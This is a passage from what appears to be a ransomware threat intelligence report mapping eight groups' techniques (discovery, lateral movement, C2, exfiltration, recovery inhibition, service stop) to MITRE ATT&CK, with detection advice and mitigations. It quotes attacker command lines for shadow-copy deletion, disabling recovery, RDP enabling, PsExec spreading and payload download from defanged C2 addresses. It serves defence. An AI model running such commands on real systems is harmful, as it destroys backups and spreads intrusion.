ransomwares use the NetShareEnum() and\nGetLogicalDriveStrings() WinAPI functions.\n\n**BlackByte, for example, performed the commands via net.exe:**\n```\n                    Command _ line: “net share”\n                    Command _ line: “net view”\n\n```\n**Lockbit, as we mentioned before, enumerates network shares trying**\nto connect to them using the TCP ports 135, 445\n\n##### Conclusion:\n\nAs we see, the three techniques presented above are overlapping with\neach other. They are united with the purpose to obtain information\nabout the network infrastructure of a victim and navigate in the\norganisation’s network in order to make the attack more effective.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Network Share Discovery via Standard Windows**\n**Utilities**\n\n**Appendix#1 - Network Share Discovery via PowerShell**\n\n\n-----\n\nAccount Discovery T1087 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nThe Account Discovery technique is the listing of all accounts in an\norganisation. The information gained allows ransomware actors to\ndetermine which accounts they can use for achieving their purposes.\nRansomware actors are interested in accounts that have elevated\nprivileges; for example, local administrators, administrators of various\nservices, service accounts, groups with high permissions, etc.\n\nThe common commands we meet in the ransomware attacks:\n```\n                    Command _ line: “whoami /groups”\n                    Command _ line: “net group “Enterprise admins” /domain”\n\n```\nCommand _ line: “net group “Domain admins” /domain”\n\nWe observed the usage of the Find-LocalAdminAccess command\nfrom the Recon module of Powersploit, by Pysa actors. This command\nfinds computers where the current user has local administrator\nprivileges. Bloodhound also helps to determine which accounts are\nmembers of high privileged groups.\n\n##### Conclusion:\n\nThe information gained from Account Discovery helps ransomware\nactors to perform lateral movement and privilege escalation. Monitor\nthe commands that can be executed to enumerate user accounts\nand groups in a domain. Implement PowerShell logging to detect\ncommands from popular tools (BloodHound, Powersploit, etc).\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 -Account Discovery via Standard Windows Utilities**\n\n**Appendix#1 - Account Discovery via PowerShell**\n\n\n-----\n\nFile and Directory Discovery T1083 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\n**File and Directory discovery is a technique involving enumerating**\n**files and directories in order to determine whether certain objects**\n**should be encrypted/stolen or not. Ransomware Trojans usually**\n**search for specific extensions to encrypt files or specific patterns**\n**in a file name: pptx, xlsx, docx, etc.**\n\n**In the picture below you can see the presentation of automatic**\n**search:**\n\nFig. 29 — Suspicious Activity: Automatic Search\n\n\n-----\n\n**“*secret*”, “*private*”, “*confident*”, “*important*”, “*federal*”,**\n**“*government*”, “*security*”, “*fraud*”, “*secret*”, “*balance*”,**\n**“*statement*”, “*checking*”, “*saving*”, “*routing*”, “*finance*”,**\n**“*agreement*”, “*SWIFT*”, “*license*”, “*Compilation*”,**\n**“*report*”, “*secret*”, “*confident*”, “*hidden*”, “*clandestine*”,**\n**“*illegal*”, “*compromate*”, “*privacy*”, “*private*”, “*contract*”,**\n**“*concealed*”, “*clandestine*”, “*investigation*”, “*federal*”,**\n**“*bureau*”, “*government*”, “*security*”, “*unclassified*”, “*seed*”,**\n**“*personal*”, “*confident*”, “*mail*”, “*letter*”, “*passport*”,**\n**“*billing*”, “*payment*”, “*budget*”, “*bank*”, “*cash*”, “*payroll*”,**\n**“*scans*”**\n\n**Moreover, ransomware trojans typically avoid breaking the system,**\n**they make folder exclusions and skip encrypting system folders,**\n**browsers and other software.**\n\n##### Conclusion:\n\n**File and Directory discovery techniques are employed by many**\n**ransomware programs, since their main goal is to encrypt and/or**\n**steal data that is critical for the user in order to demand a ransom.**\n**Therefore, it is necessary to monitor access to many critical files**\n**and directories. Because groupings most often discover files and**\n**directories through the Windows API, we recommend using EDR**\n**solution to detect this activity.**\n\n\n-----\n\nProcess Discovery T1057 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nProcess Discovery consists of methods that enumerate active\nprocesses in order to form the next steps of an attack. One way or\nanother, ransomware performs process discovery or enumeration\nin order to terminate them so that they do not interfere with the\nencryption process.\n\nFor example, some ransomware programs call the\n**CreateToolhelp32Snapshot for getting a snapshot of the running**\nprocesses; then they use Process32First and Process32Next to\nenumerate the snapshot.\n\nAs we have seen earlier, Pysa uses the wmic tool to get process info\nand immediately deletes them.\n\nFig. 30 — Pysa script\n\n##### Conclusion:\n\nAll the described ransomware strains perform process discovery as\nthey need to ensure that no process locks the files and prevents them\nfrom being encrypted. Monitor for the “tasklist.exe” command and\n“Get-Process” via PowerShell.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Process Discovery via Standard Windows Utilities**\n\n**Appendix#1 - Process Discovery via PowerShell**\n\n\n-----\n\n## Lateral Movement\n\nLateral movement refers to taking control of remote systems. It\nis related to the event of spreading ransomware over the victim’s\nnetwork in order to encrypt more systems. Ransomware actors often\nuse Windows remote services such as RDP, SMB/Admin Shares,\nWinRM. Let’s consider the most popular techniques and patterns of\nlateral movement.\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|Remote Services: Remote Desktop Protocol T1021.001|||||||||\n|Lateral Tool Transfer T1570|||||||||\n|Remote Services: SMB/ Windows Admin Shares T1021.002|||||||||\n\n\nSMB/\nWindows\nAdmin\nShares\nT1021.002\n\n\n-----\n\nRemote Services: Remote Desktop Protocol T1021.001 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nThreat Actors use RDP to spread over the network or to maintain\nremote access in the infected system. As we know, RDP is a very\npopular infection vector. Ransomware actors get access to the system\nvia exposed RDP. After gaining access, actors continue to move\nthrough the network using Remote Desktop Connections.\n\nAccording to GERT investigations, after initial access, Lockbit moves\nthrough the network via multiple RDP connections.\n\n**Conti enables RDP in the Windows Registry and Firewall Configuration:**\n\nCommand_line:\n\n### • [“reg add “HKLM\\System\\CurrentControlSet\\Control\\Terminal ]\nServer” /v “fDenyTSConnections” /t REG_DWORD /d 0 /f\n\n### • [“netsh advfirewall firewall set rule group=”Remote Desktop” new ]\nenable=yes”\n\n### • [“reg add “HKLM\\System\\CurrentControlSet\\Control\\Terminal ]\nServer|WinStations\\RDP-Tcp” /v “UserAuthentication” /t REG_\nDWORD /d 0 /f”\n\nIn a GERT incident response investigation, Pysa was observed to\nconnect to other servers via RDP:\n\n### • [mstsc /v xxx]\n • [mstsc /v xxx\\c$]\n\n**Pysa enables RDP in its PowerShell Script**\n(398B71C2B6B9EF8ABD47DEACE3E844D3):\n\nFig. 31 — Pysa PowerShell script\n\n\n-----\n\n### • [Set-ItemProperty -Path ‘HKLM:\\System\\CurrentControlSet\\]\nControl\\Terminal Server’-Name “fDenyTSConnections” -Value 0\n\n### • [Enable-NetFirewallRule -DisplayGroup “Remote Desktop”]\n\n##### Conclusion:\n\nAs Remote Desktop Connections is a common Windows feature,\nransomware actors actively use it. If it is unnecessary it should be\ndisabled. Consider which accounts should be members of the Remote\nDesktop Users group. Additionally if you have an external RDP server,\nimplement multi-factor authentication and protect it with firewall\nrules. Monitor for suspicious RDP connections (for example, a user\nwho has never previously connected to a certain system), multiple\nconnections at the same time performed by a single user, or suspicious\ntime or location for connections.\n\n**SIGMA:**\n\n**Appendix#1 - Enabling RDP via Registry**\n\n**Appendix#1 - Enabling RDP in Windows Firewall**\n\n\n-----\n\nLateral Tool Transfer T1570 - 7/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware threat actors transfer files from one system to other\nremote hosts for lateral movement. Adversaries use inherent file\nsharing protocols such as file sharing over SMB to connected network\nshared folders or connect with gained credentials via SMB/Windows\nAdmin Shares or RDP. The most popular tool for lateral movement is\nPSExec (Pysa, LockBit, BlackCat, Hive):\n```\n                    Command _ line: “psexec.exe -accepteula -d -s \\\\<ip _\n                    address> <executable _ path>”\n\n```\nRansomware actors also used cmd to copy files via SMB:\n```\n                    Command _ line: “cmd /c copy <executable _ path> \\\\<ip _\n\n```\naddress>\\ADMIN$ /y”\n\nConti and Hive ransomware groups have also been observed to use a\nmore sophisticated method - using bitsadmin:\n\nCommand _ line: “Bitsadmin /transfer debjob /download \\\\\n\n[localuser]\\C$\\Windows\\[Conti].dll C:\\Windows\\[conti].dll”\n\nAfter gaining access to the service accounts some adversaries\n(BlackByte) utilised AnyDesk for lateral movement. Monitoring for\n\n**SIGMA: (Available in the full version** AnyDesk activity can be an early indicator of compromise if AnyDesk is\n**of the report in Kaspersky TIP)** not utilised or allowed by your organisation.\n\n**Appendix#1 - File Download via**\n**Bitsadmin**\n\n**Appendix#1 - Psexec Suspicious** Conclusion:\n**Commands**\n\nThreat actors copy their ransomware to compromised hosts via file\n\n**Appendix#1 - PsExec Pipes**\n**Artifacts** sharing over SMB/Windows Admin Shares and via standard utilities\n\n(psexec, cmd, bitsadmin, etc) in order to spread programs and encrypt\n\n**Appendix#1 - Mounting Shares via**\n**net** as many hosts as possible. As these utilities can be used legitimately\n\nby administrators of an organisation, we recommend that the use of i\n\n**Appendix#1 - Using Explicit**\n\n\n-----\n\nRemote Services: SMB/Windows Admin Shares T1021.002 - 7/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nSMB (Server Message Block) is the most common protocol used by\nransomware threat actors to move laterally through a network. Some\nexecution techniques overlap with it. Scheduled tasks, services, WMI\nmay be executed over SMB.\n\n**Pysa launched PowerShell script p.ps1 from a network share on a**\nremote host:\n\nCommand _ line: “powershell.exe -ExecutionPolicy Bypass\n-file \\\\[REMOTE _ HOSTNAME]\\share$\\p.ps1”\n\n**Pysa files that have been found in the same folder as the**\nabovementioned PowerShell script:\n\n### • [C:\\share$\\HappyEnd.bat]\n • [C:\\share$\\p.ps1]\n • [C:\\share$\\B.bat]\n • [C:\\share$\\Psexec.exe]\n • [C:\\share$\\Servers0.bat]\n • [C:\\share$\\Workstations0.bat]\n\n**Hive ransomware was propagated the following way. The threat actors**\nuse a script, COPY.bat, that copies the Trojan xxx.exe from the share$\nfolder to the folder C:\\windows\\temp\\ on different systems on the\nnetwork (the list of IP addresses was located in files comps##.txt)\nusing the PsExec tool:\n```\n                    “PsExec.exe /accepteula @comps##.txt -u\n\n```\n“<domain>\\<username>” -p “<password>” cmd /c COPY\n```\n                    “\\\\<xxx>\\share$\\xxx.exe” “C:\\windows\\temp\\””\n\n```\nMultiple files named comps##.txt were found on the system in “C:\\\nshare$\\”. These files contain lists of internal IP addresses targeted by\nmalware deployment.\n\n\n-----\n\n“/share$/comps1.txt”\n\n“/share$/comps10.txt”\n\n“/share$/comps11.txt”\n\n“/share$/comps12.txt”\n\n…\n\n“/share$/comps98.txt”\n\nFor some ransomware strains the attackers may specify the Trojan\noperation mode to encrypt files available for modification over\nthe network and stored on remote hosts. Conti ransomware has a\ncommand line option to encrypt remote shares via SMB (Encrypt-\nmode)\n\n**BlackCat increases the upper limit on the number of concurrent**\nrequests between a server and clients by increasing the MaxMpxCt to\nthe maximum allowed with:\n\nCommand _ line: “reg add HKEY _ LOCAL _ MACHINE\\SYSTEM\\\nCurrentControlSet\\Services\\LanmanServer\\Parameters /v\nMaxMpxCt /d 65535 /t REG _ DWORD /f”,\n\nIn order to move laterally Lockbit enumerates network shares trying to\nconnect to them using the TCP ports 135, 445.\n\n##### Conclusion\n\nSMB is one of the most common protocols used for lateral movement.\nRansomware actors may transfer their malware over Windows Admin\nShares or just remotely encrypt via SMB. Track all suspicious activities\nrelated to SMB, such as executable transfer, command-line options\ndesigned to interact with Admin Shares, SMB scanning, etc.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - PsExec Suspicious Commands**\n\n**Appendix#1 - PsExec Pipes Artifacts**\n\n**Appendix#1 - Mounting Shares via net**\n\n**Appendix#1 - Using Explicit Credentials while mounting Share**\n\n\n-----\n\n## Command and Control\n\nTo communicate and control the systems to which the attackers have\naccess Command and Control (C2) techniques are used. This allows\nattackers to change the direction of the attack depending on the\nsituation, or perform additional actions. Most of the communication\nmethods try to look like normal, legitimate traffic, like HTTP or ICMP,\nalthough more advanced obfuscation methods, like proxy or tunnelling\nusage, are also possible. Often, Remote Access Tools are used for this\ntactic, or software with similar functionality.\n\nIn addition, actors use not only standard C2 technique - Application\nLayer Protocol, Web Protocols - but also others in individual cases:\nProxy, Protocol Tunnelling, Non-Standard Port, FTP, Data Encoding, we\ndecided to present the most popular one among analysed ransomware\ngroups:\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|Application Layer Protocol: Web Protocols T1071.001|||||||||\n\n\nProtocols\nT1071.001\n\n\n-----\n\nApplication Layer Protocol: Web Protocols T1071.001 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nCommand and Control (C2) Servers are widely used by ransomware\nactors. They may download malware and auxiliary scripts, control\ncompromised systems via C2 channels or even check if C2 is alive in\norder to execute ransomware - the last one refers to anti-analysis\ntechnique.\n\nSome ransomware actors execute malicious code from an external\nresource - C2. They use rundll32.exe, mshta.exe, regsvr32.exe,\nmsiexec.exe and other Microsoft-signed utilities. For example, the\nFLAWEDAMMY Trojan used by the TA505 group, was installed via\nmsiexec:\n\nCommand _ line: “$windir\\$system32\\msiexec.exe” /q /i\nhxxp://27.102.70[.]196/km\n\n**Conti actors downloaded QBot via an Excel document, attached to a**\nphishing email:\n\nImage _ path: $programfiles\\Microsoft Office\\Office14\\EXCEL.\nEXE\nURL: hxxp://101.99.95[.]143/44657.5824381944.dat\n\n\n-----\n\nFig. 32 — Threat Intelligence Platform\n\nThe most popular way to download malware is via PowerShell.\nCobaltStrike is often installed via a base64-encoded PowerShell\ncommand. According to GERT investigations, Lockbit launched an\nobfuscated PowerShell script to download a file from “http[:]//<xxx>:80/\nlogin?return_to”. The downloaded file was not obtained.\n\nThe other way to use C2 is data exfiltration. Hive uses the RedLine\nStealer malware, according to GERT Incident investigation results.\nDepending on the RedLine version, it can utilise HTTP+ SOAP, .NET\nBinary Format SOAP or JSON for communication with the C2 server. In\naddition to the ability to download user data, RedLine Stealer also has\nbasic backdoor functionality. It can download and run files, execute\ncommands via cmd.exe or open links via a standard browser. All the\ncollected data is posted back to the C2 via the HTTP protocol.\n\nDepending on the configuration, the Stealer can communicate through\na non-standard port (e.g. 37026 or any other unusual port number),\nwhich falls also under the T1571 Non-Standard Port technique.\n\nThe BlackByte group transfers a Cobalt Strike beacon to the victim\nusing the webshell they placed there. After the beacon is placed, they\ntransfer the AnyDesk application, which also falls under the technique\nT1105 Ingress Tool Transfer.\n\n##### Conclusion\n\nIn our cases, we see that all actors in one way or another use the\napplication layer protocol: Web Protocols T1071.001, especially\nthrough the use of CobaltStrike C2. Although various deviations\nfrom the strict definition of this technique are possible, in the form\nof using a non-standard port, proxy or sending additional software\nfor remote control, all of these methods are based on the technique\n\n\n-----\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|Exfiltration Over C2 Channel T1041|||||||||\n|Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002|||||||||\n\n\n## Exfiltration\n\nThe main task of ransomware, besides data encryption itself, is\ndata exfiltration. The downloaded data can be leveraged when\nblackmailing the victim, greatly increasing the likelihood of ransom\npayments. More often than not, ransomware actors steal data before\nthe actual encryption. The methods and specific sub-techniques by\nwhich attackers exfiltrate data will be discussed below.\n\nClop Ragnar\nConti Pysa Hive Lockbit BlackByte BlackCat\n(TA505) Locker\n\nExfiltration\nOver C2\nChannel\nT1041\n\nExfiltration\nOver Web\nService:\nExfiltration\nto Cloud\nStorage\nT1567.002\n\n\n-----\n\nExfiltration Over C2 Channel T1041 - 6/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAs mentioned earlier, threat actors commonly use the double extortion\ntechnique. This means that in addition to encryption, ransomware\noperators also extract sensitive information from the victim’s\ninfrastructure. In this case, the likelihood of an attacker obtaining a\nransom increases. This is because the victim’s organisation may suffer\nreputational, financial, and other losses from the disclosure of the\nstolen information.\n\nThe common way to exfiltrate data is via their primary C2 channel.\n**Pysa threat actor used a script to search all the directories on all hard**\ndisks and transfer the files to the C&C server in a base64-encoded\nform.\n\nFig. 33 — Pysa script\n\nOnly files whose names contain substrings from the screen below will\nbe transferred. Pysa also excludes a large list of extensions:\n\n\n-----\n\nFig. 34 — Pysa. Excluded extensions in script\n\n**Lockbit developed the StealBit tool to exfiltrate data to the remote C2**\nserver. StealBit is supposed to be faster than any other tool they use.\nStealBit establishes a TCP connection with a hardcoded list of C2 IP\naddresses.\n\n**Clop ransomware exploits vulnerabilities in the Accellion FTA,**\nsubsequently installing the DEWMODE web shell to exfiltrate data.\n\nRedLine stealer, used by the Hive group, exfiltrates a large variety\nof data. Depending on the C&C server configuration, version or\nmodification, RedLine is capable of searching the file system for\nspecific data, such as logins, passwords, cookies, credit cards,\ncryptocurrency wallets, credentials for gaming platforms, etc. After\nfinding interesting files the stealer sends them to the C&C server via\nits communication channel.\n\nPopular ‘FileGrabber’ configuration rules:\n\n### • [%userprofile%\\Desktop|*.txt,*.doc*,*key*,*wallet*,*seed*]\n • [%userprofile%\\Documents|*.txt,*.doc*,*key*,*wallet*,*seed*]\n\n##### Conclusion\n\nOften ransomware actors use the same protocol as command and\ncontrol communications. Exfiltration over a C2 channel is a common\nway to exfiltrate data. Analysing anomalies in network traffic can\nhelp to detect data leakage, monitor for processes that normally do\nnot initiate connections and command line options that may indicate\nnetwork connection.\n\n\n-----\n\nExfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002 - 6/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nThreat actors often exfiltrate data to a cloud storage service rather\nthan over their command and control channel. Cloud storage services\nprovide attackers with storage in which they can place data and then\nretrieve it over the Internet. Moreover, exfiltration via cloud services\nmay be unremarkable network traffic as hosts in an organisation may\nuse cloud services for legitimate purposes.\n\nMegaSync is the common cloud storage service used by ransomware\nactors (LockBit, Conti, BlackCat, Hive). Also, we observed\nFreeFileSync used by LockBit.\n\n**Conti and BlackCat use rclone - an open-source program to send files**\nto the cloud.\n\nBesides mega.nz Hive sent user files to these cloud services:\n\n### • [anonfiles.com]\n • [send.exploit.in]\n • [ufile.io]\n • [sendspace.com]\n\n**BlackByte sends files to anonymous cloud services:**\n\n### • [anonymfiles.com]\n • [file.io]\n\n##### Conclusion\n\nAs ransomware actors increasingly use cloud storage services,\nprocesses connecting to popular cloud URLs that do not normally\ninteract with them can be detected. Monitoring unusually high traffic\nvolumes toward a cloud service is an additional indicator of exfiltration.\n\n\n-----\n\n## Impact\n\n\nThe main goal of the attackers is clear from the type of the analysed\nmalware - ransomware. In order to successfully attack, ransomware\nactors aim to encrypt all critical data and make sure that victims don’t\nhave a chance to recover data without paying. So all of the described\ngroups use the standard ransomware techniques:\n\n### • [Inhibit System Recovery]\n • [Service Stop]\n • [Data Encrypted for Impact]\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|Inhibit System Recovery T1490|||||||||\n|Service Stop T1489|||||||||\n\n\n-----\n\nInhibit System Recovery T1490 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505][)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nIn this technique, ransomware actors do everything to make it\nimpossible to recover encrypted data without ransom negotiations.\nAttackers delete backups, volume shadow copies, disable automatic\nrepair and recovery features. All this amplifies the destructive effect\nof the attack, which already involves data encryption or leakage.\n\nThe analysed ransomware Trojans perform the following commands to\ndelete shadow copies and backups:\n```\n                    Image _ path: “$windir\\$system32\\vssadmin.exe”\n\n```\nCommand _ line: “vssadmin delete shadows /all /quiet “\n\nImage _ path: “$windir\\$system32\\wbem\\WMIC.exe”,\n```\n                    Command _ line: “wmic shadowcopy delete “,\n                    Image _ path: “$windir\\$system32\\wbadmin.exe”\n\n```\nCommand _ line: “wbadmin delete catalog -quiet”\n\nIn addition, they disable automatic windows recovery using BCDEdit:\n```\n                    Image _ path: “$windir\\$system32\\bcdedit.exe”,\n\n```\nCommand _ line: “bcdedit /set {default} recoveryenabled\n```\n                    no”,\n\n```\nSome actors use PowerShell instead of the command line shell. For\nexample, Pysa used a PowerShell script with multiple actions, including\ncommands to remove all shadow copies and restore points.\n\nCommand _ line: “vssadmin delete shadows /all /quiet”\nCommand _ line: “Get-ComputerRestorePoint | Delete-\nComputerRestorePoint;”\n\n\n-----\n\nto ensure that the shadow copies are destroyed (BlackByte, Conti,\n**Clop):**\n```\n                    Image _ path: “$windir\\$system32\\vssadmin.exe”,\n\n```\nCommand _ line: “vssadmin resize shadowstorage /for=c:\n/on=c: /maxsize=401MB”,\n\n##### Conclusion\n\nAll the described ransomware actors perform some of the\naforementioned actions, since it is necessary for successful ransom\nnegotiations. To protect your data from encryption you should have\noffline backups. Additionally we provide SIGMA rules to detect this\ntechnique.\n\n**SIGMA:**\n\n**Appendix#1 - Shadow Copies Deletion**\n\n**Appendix#1 - Disable Automatic Windows Recovery**\n\n\n-----\n\nService Stop T1489 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505][)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware groups stop certain services - for example, those with\nnames containing “vss”, “sql”, “oracle”, “veeam”, “backup”, etc. - to\navoid skipping files used by these services.\n\nThe common way to stop services is via the Windows utility net.exe\nwith the argument “stop”:\n```\n                    Command _ line: “net stop “Acronis VSS Provider” /y”\n                    Command _ line: “net stop “Enterprise Client Service”\n                    /y”\n\n```\nCommand _ line: “net stop “SQLsafe Backup Service” /y”\nCommand _ line: “net stop “SQLsafe Filter Service” /y”\nCommand _ line: “net stop “Veeam Backup Catalog Data\n```\n                    Service” /y”\n                    Command _ line: “net stop AcronisAgent /y”\n                    etc\n\n```\n**BlackByte and Hive are observed to stop services using sc.exe:**\n\nCommand _ line: “sc.exe config SQLTELEMETRY start=\n```\n                    disabled”,\n\n```\nCommand _ line: “sc.exe config SQLTELEMETRY$ECWDB2 start=\n```\n                    disabled”,\n\n```\nCommand _ line: “sc.exe config SQLWriter start=\n```\n                    disabled”,\n\n```\nCommand _ line: “sc.exe config SstpSvc start= disabled”,\nCommand _ line: “sc.exe config MBAMService start=\n```\n                    disabled”,\n\n```\nCommand _ line: “sc.exe config wuauserv start= disabled”,\n```\n                    etc\n\n```\n**BlackCat and RagnarLocker use the TerminateProcess() API to stop**\nWindows processes which can lock files for encryption. Additionally,\nBlackCat can stop VMware ESXi virtual machines and delete\nsnapshots; and we also observed the following command to stop IIS\nservices on a system:\n\n\n-----\n\nMoreover, we see the usage of taskkill.exe in Conti campaigns:\n\nCommand _ line: “taskkill /f /im vee*”\nCommand _ line: “taskkill /f /im postg*”\n\n**Pysa stops services and processes using PowerShell commands:**\n\nFig. 35 — Pysa. PowerShell script stopping services\n\nFig. 36 — Pysa. PowerShell script stopping services\n\n##### Conclusion\n\nRansomware actors use different ways to stop processes that\nmay lock files they use. To detect the Service Stop technique we\nrecommend monitoring mass process termination and command lines\nwith the following patterns:\n\n### • [“net stop “<service_name” /y>”]\n • [“sc config “<service_name” start= disabled”]\n • [“iisreset.exe /stop”]\n • [“taskkill” and others]\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Service Stop via taskkill**\n\n**Appendix#1 - Service Stop via sc.exe**\n\n**Appendix#1 - Service Stop via Powershell.exe**\n\n**Appendix#1 - Service Stop via net.exe**\n\n\n-----\n\n## Mitigations\n\n\nWe arranged the best practices from NISTs, NCSCs, CISA, SANS,\nand others into an organised structure that can be applied within\norganisations.\n\nInformation provided by this report could be used to identify the most\ncommon ransomware vectors. Knowing these vectors makes it easier\nto implement a vector-oriented Defence-in-Depth approach. This\napproach is based on the fact that the defending side must stop the\ncapability of the threat to use the vector.\n\nWe highlight the following stages of a ransomware incident, that can\nbe mitigated or hampered for adversaries by defenders:\n\n### • [Intrusion]\nAt the intrusion stage, an adversary tries to break into a protected\nperimeter.\nExamples: spear phishing emails, bruteforce internet-facing services\n(RDP).\n**The Defenders’ Main Goal:**\nPrevent the malware from reaching the devices.\n\n### • [Exploitation]\nAt the exploitation stage, an adversary tries to run code in order to\nescalate privileges, access and exfiltrate sensitive information, or\nharvest credentials.\n**The Defenders’ Main Goal:**\nPrevent malware from launching on endpoint devices.\n\n### • [Lateral Movement]\nAt the lateral movement stage, an adversary tries to spread across the\nnetwork.\n**The Defenders’ Main Goal:**\nPrevent malware from reaching other devices.\n\nThere are additional measures that can be taken to make your\norganisation more secure:\n\n### • [Countering data loss]\n • [Preparing for an Incident]\n\n\n-----\n\n## Intrusion Prevention\n\nRansomware operators often use misconfigured Internet-facing\nservices to gain network access. Once they are in, they will be able to\nmove laterally, escalate privileges, gain access and extract sensitive\ninformation, harvest credentials, or deploy malware. The following\nrecommendations help to reduce the risk of intrusion:\n\n### • [Inbound Traffic Filtering]\nFiltering policies are implemented on edge devices (routers, firewalls,\nIDS).\n\nMail and spam filtering is important. Consider using a sandbox\nfor attachments in mail to block malicious mails and executable\nattachments. KATA can help with this.\n\n### • [Malicious Websites Block]\nRestrict access to the websites that are known to be malicious.\nConsider implementing intercepting proxies.\n\nYou can use TI feeds to be well aware of relevant threats.\n\n### • [DPI]\nUsing DPI on security gateways provides the opportunity to inspect\ncontent for known malware.\n\n### • [Malicious Code Block]\nUse signatures to block malicious code.\n\n### • [Disable RDP, if possible]\nPlace any system with an open RDP port (3389) behind a firewall and\nrequire users to VPN in through the firewall.\n\n### • [Enable MFA]\nEnable multi-factor authentication, strong passwords, and account\nlockout policies at all remote access points into the network to defend\nagainst brute-force attacks.\n\n### • [Whitelisting connections]\nEnforce IP allow listing using hardware firewalls.\n\n### • [“Least Privilege” model]\nUse low privilege accounts to authenticate, and provide an audit\nprocess to allow a user to escalate their privileges within the remote\nsession where necessary.\n\n### • [Patch known vulnerabilities]\nPatch known vulnerabilities in all remote access and internet-facing\ndevices immediately. Kaspersky Vulnerability Data Feed can provide\nyour organisation with information about security vulnerabilities and\nrelated cyber threat intelligence.\n\n\n-----\n\n## Exploitation prevention\n\nTo reduce the risk of launching malicious code on hosts, follow these\nguidelines:\n\n### • [User training]\nImprove staff competence in information security. Hold regular\ntraining sessions dedicated to this.\n\nConsider conducting SOC maturity assessments if using the services\nof the in-house SOC.\n\n### • [Application policies]\nConsider implementing app control features and Software Restriction\nPolicies (e.g. AppLocker)\n\n### • [Anti-malware products & services]\nConsider using behaviour based anti-malware products to effectively\nblock malware on endpoint devices.\n\n**KES provides you with this capability.**\n\nConsider using internal and/or external MDR services in order to\nincrease the likelihood of blocking malware at an early stage.\n\nImplementing regular pentests and RedTeam projects can significantly\nreduce the attack surface for adversaries and help the BlueTeam\nremain prepared for today’s threats.\n\n### • [Software Update]\nKeep your software up to date. This measure will reduce the surface of\nattack.\n\n### • [Restrict scripting environments and macros:]\n\n • [Consider enabling PowerShell Constrained Language mode ]\nvia a Device Guard User Mode Code Integrity (UMCI) in\norder to reduce the capability of malware\n\n### • [Block macros from running in Office files downloaded from ]\nthe Internet. As an alternative you can disable all macros\nexcept digitally signed macros.\n\n### • [Consider preventing the use of removable media or disable ]\nautorun for mounted media\n\n\n-----\n\n## Lateral Movement\n\nTo limit ransomware operator’s abilities to spread, follow these\nprinciples:\n\n### • [Credential Protection]\n\n • [Enable Credential Guard if possible]\n • [Disable WDigest]\n • [Protect lsass.exe via RunAsPPL]\n • [Do not store plain text passwords]\n • [Strong Authentication]\n\n • [Use password managers in your organisation]\n • [Enable logon restrictions/throttling]\n • [Enforce use of multi-factor authentication for internet-]\nfacing services and high-risk accounts\n\n### • [High Privilege Account Protection]\n\n • [Use high privilege accounts for administrator activities only]\n • [Consider segmenting privileged accounts and groups that ]\nrequire additional protection from the rest of the internal\norganisation\n\n### • [Least Privilege principle]\n\n • [Use a tiering model for administrative accounts to prevent ]\nthem having unnecessary access or privileges\n\n### • [Only use accounts with full privileges across an enterprise ]\nwhen absolutely necessary\n\n### • [Use time-based privileges to further restrict their use]\n • [Regularly review and remove user permissions that are no ]\nlonger required\n\n### • [Identify high-risk targets (devices, services, users) to ]\nminimise their access\n\n### • [Devices Lock Down]\n\n • [Apply patches to all devices as soon as possible, ]\ncorresponding to the patch management process in your\norganisation\n\n### • [Use secure boot mechanisms if available]\n • [Consider implementing application control policies]\n\n\n-----\n\n### • [Network Assets Segregation]\n\n • [Identify critical business systems, isolate them and apply ]\nappropriate network security controls\n\n### • [Consider implementing network monitoring]\n • [Enable logging and auditing features on your systems, and ]\nuse them to detect suspicious activity\n\n### • [Keep an audit or record of all devices that can connect to ]\nyour network, and understand high value 